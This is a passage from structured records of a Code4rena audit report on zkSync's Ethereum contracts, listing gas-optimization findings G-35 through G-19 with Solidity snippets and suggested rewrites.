      "content": "\n[File: ethereum/contracts/zksync/facets/Executor.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Executor.sol#L241-L243)\n\n```\n        for (uint256 i = 0; i < _newBatchesData.length; i = i.uncheckedInc()) {\n            // The upgrade transaction must only be included in the first batch.\n            bytes32 expectedUpgradeTxHash = i == 0 ? _systemContractUpgradeTxHash : bytes32(0);\n```\n\nThe `for` loop iterates from `0` to `_newBatchesData.length`. In every iterations (at line 243), it checks if `i == 0`. However, this condition occurs only during the first loop iteration.\nThis means, that it will be better to divide the loop into two smaller loops:\n- `for (uint256 i = 0; i < 1; i = i.uncheckedInc()) { bytes32 expectedUpgradeTxHash =  _systemContractUpgradeTxHash; (...)`.\n- `for (uint256 i = 1; i < _newBatchesData.length; i = i.uncheckedInc()) { bytes32 expectedUpgradeTxHash =  bytes32(0); (...)`.\n\nThat way, we will be performing `i == 0` check only during the first loop iteration, thus this comparison will be done at least once.\n\nMoreover, to better optimize these two loops, please make sure to declare `i` counter outside that loops. That way, you won't be redeclaring `i` inside the 2nd loop:\n\n```\nuint256 i = 0;\nfor (i; i < 1; i = i.uncheckedInc()) { \nbytes32 expectedUpgradeTxHash =  _systemContractUpgradeTxHash; \n\n(...)\n}\n\nfor (i; i < _newBatchesData.length; i = i.uncheckedInc())\n{\n    bytes32 expectedUpgradeTxHash =  bytes32(0); \n    (...)\n}\n```\n\nAdditionally, as you can notice, `expectedUpgradeTxHash` is used only once, so it does not need to be declared at all. It can be used directly:\n\n- In the first loop:\n\n```\n_lastCommittedBatchData = _commitOneBatch(\n                _lastCommittedBatchData,\n                _newBatchesData[i],\n                _systemContractUpgradeTxHash\n            );\n```\n\n- In the second loop:\n\n```\n_lastCommittedBatchData = _commitOneBatch(\n                _lastCommittedBatchData,\n                _newBatchesData[i],\n                bytes32(0)\n            );\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30377",
      "title": "[G-34] Do not assign `offset` in the last call of `UnsafeBytes.readUint256()` in `Mailbox.sol`",
      "impact": "GAS",
      "content": "\nA simple test in Remix IDE has been created, to compare gas usage of assigning more than one value from function call:\n\n```\n  function getUints() public pure returns (uint, uint) {return (1, 2);}\n   function getAll() public view {\n    uint a; uint b; \n    (a, b) = getUints();\n    uint g = gasleft();\n    (a, b) = getUints();\n    console.log(g - gasleft());\n   }\n    function getOne() public view {\n    uint a; uint b; \n    (a, b) = getUints();\n    uint g = gasleft();\n    (a, ) = getUints();\n    console.log(g - gasleft());\n   }\n```\n\n`getOne()` costs 74 gas, while `getAll()` costs 82 gas. This implies, that we shouldn't assign every parameter from function call if it's not needed.\n\nIn the last call of `UnsafeBytes.readUint256(_message, offset)` (line 427):\n\n[File: ethereum/contracts/zksync/facets/Mailbox.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L427)\n\n```\n(amount, offset) = UnsafeBytes.readUint256(_message, offset);\n```\n\nWe won't need `offset` anymore, thus we can change line 427 to: `(amount, ) = UnsafeBytes.readUint256(_message, offset);`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30376",
      "title": "[G-33] Addition in `_requestL2Transaction` in `Mailbox.sol` can be either removed or unchecked.",
      "impact": "GAS",
      "content": "\n[File: ethereum/contracts/zksync/facets/Mailbox.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L295)\n\n```\nuint64 expirationTimestamp = uint64(block.timestamp + PRIORITY_EXPIRATION); // Safe to cast\n```\n\nConstant `PRIORITY_EXPIRATION` is defined in `ethereum/contracts/zksync/Config.sol` as:\n\n```\n/// NOTE: The constant is set to zero for the Alpha release period\nuint256 constant PRIORITY_EXPIRATION = 0 days;\n```\n\nThis addition is then redundant (since we're adding `0`). However, if for further reference you want to keep this code as it is (e.g. new contract will be deployed with different Alpha release period), make this operation `unchecked` at least. Since `PRIORITY_EXPIRATION` is a constant value, known during compiling time, and `block.timestamp` is impossible to overflow, it's safe to assume, that `block.timestamp + PRIORITY_EXPIRATION` will never overflow. The max value of `uint64` converted into timestamp is `Sun Jul 21 2554`. It's almost impossible that `block.timestamp + PRIORITY_EXPIRATION` will ever exceed that number (assuming that `PRIORITY_EXPIRATION` will be set to some reasonable value).\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30375",
      "title": "[G-32] Operations which won't overflow in `Mailbox.sol` can be unchecked",
      "impact": "GAS",
      "content": "\nIf, for any reason recommendation for G-31 won't be implemented, another gas optimization would be insert line 280: `s.totalDepositedAmountPerUser[_depositor] += _amount;` into unchecked block.\n\nSince `require(s.totalDepositedAmountPerUser[_depositor] + _amount <= limitData.depositCap, \"d2\");` guarantees that  `s.totalDepositedAmountPerUser[_depositor] + _amount` won't overflow, we can perform 2nd addition as unchecked: `unchecked {s.totalDepositedAmountPerUser[_depositor] += _amount;}`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30374",
      "title": "[G-31] Reduce number of additions and readings of `s.totalDepositedAmountPerUser[_depositor]` in `_verifyDepositLimit()` in `Mailbox.sol`",
      "impact": "GAS",
      "content": "\n[File: ethereum/contracts/zksync/facets/Mailbox.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L279-L280)\n\n```\n        require(s.totalDepositedAmountPerUser[_depositor] + _amount <= limitData.depositCap, \"d2\");\n        s.totalDepositedAmountPerUser[_depositor] += _amount;\n```\n\nThere's no need to access `s.totalDepositedAmountPerUser[_depositor]` twice and perform addition two times. Much cheaper solution would be to cache `s.totalDepositedAmountPerUser[_depositor] + _amount`.\nCode can be rewritten to:\n\n```\nuint256 totalDepositedAmountPerUserAndAmount = s.totalDepositedAmountPerUser[_depositor] + _amount;\nrequire(totalDepositedAmountPerUserAndAmount <= limitData.depositCap, \"d2\");\n```\n\nWe've cached `s.totalDepositedAmountPerUser[_depositor] + _amount`, and then later checked if it does not exceed limit. If it does, the function will revert.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30373",
      "title": "[G-30] Unnecessary variables in `Mailbox.sol`",
      "impact": "GAS",
      "content": "\n**Function `_proveL2LogInclusion`:**\n\nVariables `calculatedRootHash` and `actualRootHash` are used only once, which means they don't need to be declared at all. The code snippet below can be changed from:\n\n[File: ethereum/contracts/zksync/facets/Mailbox.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L142-L145)\n\n```\nbytes32 calculatedRootHash = Merkle.calculateRoot(_proof, _index, hashedLog);\n        bytes32 actualRootHash = s.l2LogsRootHashes[_batchNumber];\n\n        return actualRootHash == calculatedRootHash;\n```\n\nTo:\n\n```\nreturn s.l2LogsRootHashes[_batchNumber] == Merkle.calculateRoot(_proof, _index, hashedLog);\n```\n\n**Function `l2TransactionBaseCost`:**\n\nVariable `l2GasPrice ` is used only once, which means it doesn't need to be declared at all. The code snippet below can be changed from:\n\n[File: ethereum/contracts/zksync/facets/Mailbox.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L171-L172)\n\n```\n        uint256 l2GasPrice = _deriveL2GasPrice(_gasPrice, _l2GasPerPubdataByteLimit);\n        return l2GasPrice * _l2GasLimit;\n```\n\nTo:\n\n```\nreturn _deriveL2GasPrice(_gasPrice, _l2GasPerPubdataByteLimit) * _l2GasLimit;\n```\n\n**Function `_deriveL2GasPrice`:**\n\nVariables `pubdataPriceETH` and `minL2GasPriceETH` are used only once, which means they don't need to be declared at all. The code snippet below can be changed from:\n\n[File: ethereum/contracts/zksync/facets/Mailbox.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L180-L183)\n\n```\n        uint256 pubdataPriceETH = L1_GAS_PER_PUBDATA_BYTE * _l1GasPrice;\n        uint256 minL2GasPriceETH = (pubdataPriceETH + _gasPricePerPubdata - 1) / _gasPricePerPubdata;\n\n        return Math.max(FAIR_L2_GAS_PRICE, minL2GasPriceETH);\n```\n\nTo:\n\n```\n        return Math.max(FAIR_L2_GAS_PRICE, (L1_GAS_PER_PUBDATA_BYTE * _l1GasPrice + _gasPricePerPubdata - 1) / _gasPricePerPubdata);\n```\n\n**Function `_requestL2Transaction`:**\n\nVariables `expirationTimestamp`, `txId`, `baseCost` are used only once, which means they don't need to be declared at all. The code snippet below can be changed from:\n\n[File: ethereum/contracts/zksync/facets/Mailbox.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L283-L328)\n\n```\nuint64 expirationTimestamp = uint64(block.timestamp + PRIORITY_EXPIRATION); // Safe to cast\nuint256 txId = s.priorityQueue.getTotalPriorityTxs();\n\n(...)\n\nuint256 baseCost = params.l2GasPrice * _l2GasLimit;\nrequire(msg.value >= baseCost + _l2Value, \"mv\"); // The `msg.value` doesn't cover the transaction cost\n\n(...)\n\nparams.sender = _sender;\nparams.txId = txId;\nparams.l2Value = _l2Value;\nparams.contractAddressL2 = _contractAddressL2;\nparams.expirationTimestamp = expirationTimestamp;\nparams.l2GasLimit = _l2GasLimit;\nparams.l2GasPricePerPubdata = _l2GasPerPubdataByteLimit;\nparams.valueToMint = msg.value;\nparams.refundRecipient = refundRecipient;\n```\n\nTo:\n\n```\nrequire(msg.value >= params.l2GasPrice * _l2GasLimit + _l2Value, \"mv\"); // The `msg.value` doesn't cover the transaction cost\n\n(...)\n\nparams.sender = _sender;\nparams.txId = s.priorityQueue.getTotalPriorityTxs();\nparams.l2Value = _l2Value;\nparams.contractAddressL2 = _contractAddressL2;\nparams.expirationTimestamp = uint64(block.timestamp + PRIORITY_EXPIRATION);\nparams.l2GasLimit = _l2GasLimit;\nparams.l2GasPricePerPubdata = _l2GasPerPubdataByteLimit;\nparams.valueToMint = msg.value;\nparams.refundRecipient = refundRecipient;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30372",
      "title": "[G-29]  In `Diamond.sol` in `_initializeDiamondCut()`, order of `require` can be changed",
      "impact": "GAS",
      "content": "\n[File: ethereum/contracts/zksync/libraries/Diamond.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/libraries/Diamond.sol#L302-L303)\n\n```\nrequire(data.length == 32, \"lp\");\nrequire(abi.decode(data, (bytes32)) == DIAMOND_INIT_SUCCESS_RETURN_VALUE, \"lp1\");\n```\n\nThe order of `require` can be changed, firstly check if `abi.decode` is `DIAMOND_INIT_SUCCESS_RETURN_VALUE`, then check its length:\n\n```\nrequire(abi.decode(data, (bytes32)) == DIAMOND_INIT_SUCCESS_RETURN_VALUE, \"lp1\");\nrequire(data.length == 32, \"lp\");\n```\n\nIt will save some gas in multiple scenarios:\n\n- When `data.length < 32` - decoding will revert and there will be no need to execute `require(data.length == 32, \"lp\");`.\n- When `data.length > 32`, but first 32 bytes of `data` are not `DIAMOND_INIT_SUCCESS_RETURN_VALUE` - comparison will revert and there will be no need to execute `require(data.length == 32, \"lp\");`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30371",
      "title": "[G-28] In `Diamond.sol`, move some `require` on top of function",
      "impact": "GAS",
      "content": "\nFunctions `_addFunctions`, `_replaceFunctions`, `removeFunctions`, firstly gets the pointer to the diamond storage: `DiamondStorage storage ds = getDiamondStorage();` and then, they perform a check, if a user passed a proper `_facet` address. Those lines can, however, be swapped. If a user provides incorrect `_facet`, then the function should immediately revert. Afterward, it should get the pointer to the diamond storage.\n\nIn `_addFunctions()`, change:\n\n```\nDiamondStorage storage ds = getDiamondStorage();\nrequire(_facet != address(0), \"G\"); // facet with zero address cannot be added\n```\n\nTo:\n\n```\nrequire(_facet != address(0), \"G\"); // facet with zero address cannot be added\nDiamondStorage storage ds = getDiamondStorage();\n```\n\nIn `_replaceFunctions`, change:\n\n```\nDiamondStorage storage ds = getDiamondStorage();\nrequire(_facet != address(0), \"K\"); // cannot replace facet with zero address\n```\n\nTo:\n\n```\nrequire(_facet != address(0), \"K\"); // cannot replace facet with zero address\nDiamondStorage storage ds = getDiamondStorage();\n```\n\nIn `_removeFunctions`, change:\n\n```\nDiamondStorage storage ds = getDiamondStorage();\nrequire(_facet == address(0), \"a1\"); // facet address must be zero\n```\n\nTo:\n\n```\nrequire(_facet == address(0), \"a1\"); // facet address must be zero\nDiamondStorage storage ds = getDiamondStorage();\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30370",
      "title": "[G-27] Function `diamondCut()` from `Diamond.sol` can be redesigned to revert earlier",
      "impact": "GAS",
      "content": "\n[File: ethereum/contracts/zksync/libraries/Diamond.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/libraries/Diamond.sol#L101-L106)\n\n```\n101:    Action action = facetCuts[i].action;\n102:    address facet = facetCuts[i].facet;\n103:    bool isFacetFreezable = facetCuts[i].isFreezable;\n104:    bytes4[] memory selectors = facetCuts[i].selectors;\n105:\n106:    require(selectors.length > 0, \"B\"); // no functions for diamond cut\n```\n\nYou can check selectors' length earlier. If their length is `0`, then the function will revert without wasting gas on executing lines: 101-103. \n\nChange the above code to:\n\n```\nbytes4[] memory selectors = facetCuts[i].selectors;\nrequire(selectors.length > 0, \"B\"); // no functions for diamond cut\nAction action = facetCuts[i].action;\naddress facet = facetCuts[i].facet;\nbool isFacetFreezable = facetCuts[i].isFreezable;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30369",
      "title": "[G-26] Unnecessary variables in `Diamond.sol`",
      "impact": "GAS",
      "content": "\n**Function `diamondCut`:**\n\nVariables `facet` and `isFacetFreezable` are used only once, which means they don't need to be declared at all. The code snippet below can be changed from:\n\n[File: ethereum/contracts/zksync/libraries/Diamond.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/libraries/Diamond.sol#L101-L113)\n\n```\n Action action = facetCuts[i].action;\n            address facet = facetCuts[i].facet;\n            bool isFacetFreezable = facetCuts[i].isFreezable;\n            bytes4[] memory selectors = facetCuts[i].selectors;\n\n            require(selectors.length > 0, \"B\"); // no functions for diamond cut\n\n            if (action == Action.Add) {\n                _addFunctions(facet, selectors, isFacetFreezable);\n            } else if (action == Action.Replace) {\n                _replaceFunctions(facet, selectors, isFacetFreezable);\n            } else if (action == Action.Remove) {\n                _removeFunctions(facet, selectors);\n```\n\nTo:\n\n```\n Action action = facetCuts[i].action;\n            bytes4[] memory selectors = facetCuts[i].selectors;\n\n            require(selectors.length > 0, \"B\"); // no functions for diamond cut\n\n            if (action == Action.Add) {\n                _addFunctions(facetCuts[i].facet, selectors, facetCuts[i].isFreezable);\n            } else if (action == Action.Replace) {\n                _replaceFunctions(facetCuts[i].facet, selectors, facetCuts[i].isFreezable);\n            } else if (action == Action.Remove) {\n                _removeFunctions(facetCuts[i].facet, selectors);\n```\n\n**Function `_saveFacetIfNew`:**\n\nVariable `selectorsLength` is used only once, which means it doesn't need to be declared at all. The code snippet below can be changed from:\n\n[File: ethereum/contracts/zksync/libraries/Diamond.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/libraries/Diamond.sol#L193-L195)\n\n```\nuint256 selectorsLength = ds.facetToSelectors[_facet].selectors.length;\n        // If there are no selectors associated with facet then save facet as new one\n        if (selectorsLength == 0) {\n```\n\nTo:\n\n```\nif (ds.facetToSelectors[_facet].selectors.length == 0) {\n```\n\n\n**Function `_addOneFunction`:**\n\nVariable `selector0` is used only once, which means it doesn't need to be declared at all. The code snippet below can be changed from:\n\n[File: ethereum/contracts/zksync/libraries/Diamond.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/libraries/Diamond.sol#L219-L220)\n\n```\n bytes4 selector0 = ds.facetToSelectors[_facet].selectors[0];\n            require(_isSelectorFreezable == ds.selectorToFacet[selector0].isFreezable, \"J1\");\n```\n\nTo:\n\n```\n\n            require(_isSelectorFreezable == ds.selectorToFacet[ds.facetToSelectors[_facet].selectors[0]].isFreezable, \"J1\");\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30368",
      "title": "[G-25] Unnecessary variables in `Getters.sol`",
      "impact": "GAS",
      "content": "\n**Function `isFacetFreezable`:**\n\nVariables `selectorsArrayLen` and `selector0` are used only once, which means they don't need to be declared at all. The code snippet below can be changed from:\n\n[File: ethereum/contracts/zksync/facets/Getters.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Getters.sol#L140-L143)\n\n```\n uint256 selectorsArrayLen = ds.facetToSelectors[_facet].selectors.length;\n        if (selectorsArrayLen != 0) {\n            bytes4 selector0 = ds.facetToSelectors[_facet].selectors[0];\n            isFreezable = ds.selectorToFacet[selector0].isFreezable;\n```\n\nTo:\n\n```\n        if (ds.facetToSelectors[_facet].selectors.length != 0) {\n            isFreezable = ds.selectorToFacet[ds.facetToSelectors[_facet].selectors[0]].isFreezable;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30367",
      "title": "[G-24] Unnecessary variables in `TransactionValidator.sol`",
      "impact": "GAS",
      "content": "\n**Function `getOverheadForTransaction`:**\n\nVariables `txSlotOverhead`, `overheadForLength`, `numerator` and `denominator` are used only once, which means they don't need to be declared at all. The code snippet below can be changed from:\n\n[File: ethereum/contracts/zksync/libraries/TransactionValidator.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/libraries/TransactionValidator.sol#L141-L165)\n\n```\nuint256 txSlotOverhead = Math.ceilDiv(batchOverheadGas, MAX_TRANSACTIONS_IN_BATCH);\nbatchOverheadForTransaction = Math.max(batchOverheadForTransaction, txSlotOverhead);\n\n// The overhead for occupying the bootloader memory can be derived from encoded_len\nuint256 overheadForLength = Math.ceilDiv(_encodingLength * batchOverheadGas, BOOTLOADER_TX_ENCODING_SPACE);\nbatchOverheadForTransaction = Math.max(batchOverheadForTransaction, overheadForLength);\n\n(...)\n\nuint256 numerator = batchOverheadGas * _totalGasLimit + L2_TX_MAX_GAS_LIMIT;\nuint256 denominator = L2_TX_MAX_GAS_LIMIT + batchOverheadGas;\n\noverheadForGas = (numerator - 1) / denominator;\n```\n\nTo:\n\n```\nbatchOverheadForTransaction = Math.max(batchOverheadForTransaction, Math.ceilDiv(batchOverheadGas, MAX_TRANSACTIONS_IN_BATCH));\n\n// The overhead for occupying the bootloader memory can be derived from encoded_len\n\nbatchOverheadForTransaction = Math.max(batchOverheadForTransaction, Math.ceilDiv(_encodingLength * batchOverheadGas, BOOTLOADER_TX_ENCODING_SPACE));\n\n(...)\n\noverheadForGas = (batchOverheadGas * _totalGasLimit + L2_TX_MAX_GAS_LIMIT - 1) / (L2_TX_MAX_GAS_LIMIT + batchOverheadGa);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30366",
      "title": "[G-23] Multiple adding operations can be reduced in `getMinimalPriorityTransactionGasLimit` in `TransactionValidator.sol`",
      "impact": "GAS",
      "content": "\n[File: ethereum/contracts/zksync/libraries/TransactionValidator.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/libraries/TransactionValidator.sol#L69-L102)\n\n```\n                costForComputation = L1_TX_INTRINSIC_L2_GAS;\n(...)\n            costForComputation += Math.ceilDiv(_encodingLength * L1_TX_DELTA_544_ENCODING_BYTES, 544);\n(...)\n            costForComputation += _numberOfFactoryDependencies * L1_TX_DELTA_FACTORY_DEPS_L2_GAS;\n(...)\n            costForComputation = Math.max(costForComputation, L1_TX_MIN_L2_GAS_BASE);\n(...)\n            costForPubdata = L1_TX_INTRINSIC_PUBDATA * _l2GasPricePerPubdata;\n(...)\n            costForPubdata += _numberOfFactoryDependencies * L1_TX_DELTA_FACTORY_DEPS_PUBDATA * _l2GasPricePerPubdata;\n```\n\nThere's no need to perform multiple `costForComputation +=`, when it can be calculated at once:\n\n```\ncostForComputation = L1_TX_INTRINSIC_L2_GAS +  Math.ceilDiv(_encodingLength * L1_TX_DELTA_544_ENCODING_BYTES, 544) + _numberOfFactoryDependencies * L1_TX_DELTA_FACTORY_DEPS_L2_GAS;\ncostForComputation = Math.max(costForComputation, L1_TX_MIN_L2_GAS_BASE);\n```\n\nThe whole function can be rewritten to:\n\n```\n  function getMinimalPriorityTransactionGasLimit(\n        uint256 _encodingLength,\n        uint256 _numberOfFactoryDependencies,\n        uint256 _l2GasPricePerPubdata\n    ) internal pure returns (uint256) {\n        return Math.max(L1_TX_INTRINSIC_L2_GAS + Math.ceilDiv(_encodingLength * L1_TX_DELTA_544_ENCODING_BYTES, 544) + _numberOfFactoryDependencies * L1_TX_DELTA_FACTORY_DEPS_L2_GAS, L1_TX_MIN_L2_GAS_BASE) + (L1_TX_INTRINSIC_PUBDATA * _l2GasPricePerPubdata + _numberOfFactoryDependencies * L1_TX_DELTA_FACTORY_DEPS_PUBDATA * _l2GasPricePerPubdat);\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30365",
      "title": "[G-22] Use constants instead of `type(uintX).max` in `TransactionValidator.sol`",
      "impact": "GAS",
      "content": "\nWhen you use `type(uintX).max`, it may result in higher gas costs because it involves a runtime operation to calculate the `type(uintX).max` at runtime. This calculation is performed every time the expression is evaluated.\n\nTo save gas, it is recommended to use constants to represent the maximum value. Declaration of a constant with the maximum value means that the value is known at compile-time and does not require any runtime calculations.\n\n[File: ethereum/contracts/zksync/libraries/TransactionValidator.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/libraries/TransactionValidator.sol#L50-L55)\n\n```\n        require(_transaction.from <= type(uint16).max, \"ua\");\n        require(_transaction.to <= type(uint160).max, \"ub\");\n        require(_transaction.paymaster == 0, \"uc\");\n        require(_transaction.value == 0, \"ud\");\n        require(_transaction.reserved[0] == 0, \"ue\");\n        require(_transaction.reserved[1] <= type(uint160).max, \"uf\");\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30364",
      "title": "[G-21] Length of `_encoded` is calculated twice in `validateL1ToL2Transaction` in `TransactionValidator.sol`.",
      "impact": "GAS",
      "content": "\nCalculating length is gas-costly operation. It's better to calculate it once and store it in local variable.\n\n[File: ethereum/contracts/zksync/libraries/TransactionValidator.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/libraries/TransactionValidator.sol#L23-L43)\n\n```\n        uint256 l2GasForTxBody = getTransactionBodyGasLimit(\n            _transaction.gasLimit,\n            _transaction.gasPerPubdataByteLimit,\n            _encoded.length\n        );\n\n(...)\n        require(\n            getMinimalPriorityTransactionGasLimit(\n                _encoded.length,\n                _transaction.factoryDeps.length,\n                _transaction.gasPerPubdataByteLimit\n            ) <= _transaction.gasLimit,\n            \"up\"\n        );\n```\n\n`_encoded.length` is being calculated twice - in line 26 and line 38.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30363",
      "title": "[G-20] Remove local-testing related code in `DiamondInit.sol`",
      "impact": "GAS",
      "content": "\n[File: ethereum/contracts/zksync/DiamondInit.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/DiamondInit.sol#L85-L87)\n\n```\n        // While this does not provide a protection in the production, it is needed for local testing\n        // Length of the L2Log encoding should not be equal to the length of other L2Logs' tree nodes preimages\n        assert(L2_TO_L1_LOG_SERIALIZE_SIZE != 2 * 32);\n```\n\nAccording to the above code, `assert(L2_TO_L1_LOG_SERIALIZE_SIZE != 2 * 32);` is redundant and can be removed in production, since this line of code is dedicated for local testing only.\n\nThis can be confirmed in file `ethereum/contracts/zksync/Config.sol`, where constant `L2_TO_L1_LOG_SERIALIZE_SIZE` is defined as `88`. Since this is a constant value, its value will never change, thus this `assert` is unnecessary and can be removed.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30362",
      "title": "[G-19] Function `pushBack` in `PriorityQueue.sol` can be optimized",
      "impact": "GAS",
      "content": "\n[File: ethereum/contracts/zksync/libraries/PriorityQueue.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/libraries/PriorityQueue.sol#L55-L61)\n\n```\n    function pushBack(Queue storage _queue, PriorityOperation memory _operation) internal {\n        // Save value into the stack to avoid double reading from the storage\n        uint256 tail = _queue.tail;\n\n        _queue.data[tail] = _operation;\n        _queue.tail = tail + 1;\n    }\n```\n\nThe above function can be optimized by utilizing post-incrementing feature. It will allow to remove `tail` variable. Function won't be creating and reading from that variable:\n\n```\n    function pushBack(Queue storage _queue, PriorityOperation memory _operation) internal {\n        // Save value into the stack to avoid double reading from the storage\n        _queue.data[_queue.tail++] = _operation;\n        \n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
